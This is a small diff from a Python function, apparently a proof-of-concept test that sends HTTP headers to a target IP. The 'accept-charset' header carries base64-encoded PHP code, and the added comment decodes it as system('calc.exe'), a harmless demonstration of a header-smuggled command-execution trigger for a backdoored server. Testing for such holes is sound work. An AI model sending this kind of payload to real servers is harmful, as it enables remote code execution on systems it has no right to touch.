@@ -5,7 +5,7 @@ def test_post_http(ip):
         headers = {
         'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0',
 		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
-		'accept-charset': 'c3lzdGVtKCdjYWxjLmV4ZScpOw==',
+		'accept-charset': 'c3lzdGVtKCdjYWxjLmV4ZScpOw==',#system('calc.exe');
 		'Accept-Encoding': 'gzip,deflate',
 		'Accept-Language': 'en-US,en;q=0.5',
         } 
